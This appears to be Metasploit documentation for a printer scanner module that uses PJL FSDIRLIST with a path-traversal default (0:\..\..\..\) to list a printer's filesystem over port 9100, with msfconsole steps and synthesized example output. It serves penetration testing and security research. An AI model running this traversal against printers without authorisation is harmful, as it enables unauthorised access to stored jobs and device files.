## Vulnerable Application

This module targets networked printers that expose the Printer Job Language (PJL) interface on TCP port 9100 (HP JetDirect / AppSocket). It uses the PJL `FSDIRLIST` command to retrieve a directory listing from the printer's filesystem.

PJL exposes a hierarchical filesystem on devices that support it, allowing access to stored print jobs, configuration files, font caches, and — on some devices — the underlying OS filesystem via path traversal. The default `PATH` value (`0:\..\..\..\`) traverses upward from the printer's volume root using PJL's backslash path syntax, which on vulnerable devices can reach the root of the underlying filesystem.

The PRET project ([https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)) documented PJL filesystem traversal in detail; this module uses the Rex::Proto::PJL library, which draws from that research.

No authentication is required by default on most PJL implementations.

## Verification Steps

1. Start `msfconsole`
2. Do: `use auxiliary/scanner/printer/printer_list_dir`
3. Do: `set RHOSTS [target IP or range]`
4. Optionally do: `set PATH [PJL path]` (default: `0:\..\..\..\`)
5. Do: `run`
6. A successful response prints the directory listing and stores it as a note of type `printer.dir.listing` in the Metasploit database.

## Options

### RHOSTS

The target host(s) or range to scan. Accepts individual IPs, CIDR notation, or a file path prefixed with `file:`. Required.

### RPORT

The TCP port on which the printer's PJL/JetDirect interface is listening. (Default: `9100`)

### PATH

The PJL filesystem path to list. Uses PJL volume-relative syntax: `0:` refers to the first storage volume, and `\..\` segments traverse parent directories. (Default: `0:\..\..\..\`, Required)

### THREADS

Number of concurrent scan threads. (Default: `1`)

## Scenarios

### Directory listing at the PJL filesystem root

Example output (synthesized for documentation purposes; actual values will vary by device):

```
msf6 > use auxiliary/scanner/printer/printer_list_dir
msf6 auxiliary(scanner/printer/printer_list_dir) > set RHOSTS 192.168.1.45
RHOSTS => 192.168.1.45
msf6 auxiliary(scanner/printer/printer_list_dir) > run

[+] 192.168.1.45:9100 - . TYPE=DIR
.. TYPE=DIR
bin TYPE=DIR SIZE=0
dev TYPE=DIR SIZE=0
etc TYPE=DIR SIZE=0
lib TYPE=DIR SIZE=0
proc TYPE=DIR SIZE=0
tmp TYPE=DIR SIZE=0
usr TYPE=DIR SIZE=0
var TYPE=DIR SIZE=0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Listing a specific volume directory

```
msf6 auxiliary(scanner/printer/printer_list_dir) > set PATH 0:\
PATH => 0:\
msf6 auxiliary(scanner/printer/printer_list_dir) > run

[+] 192.168.1.45:9100 - . TYPE=DIR
.. TYPE=DIR
JOBS TYPE=DIR SIZE=0
FONTS TYPE=DIR SIZE=0
MACROS TYPE=DIR SIZE=0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
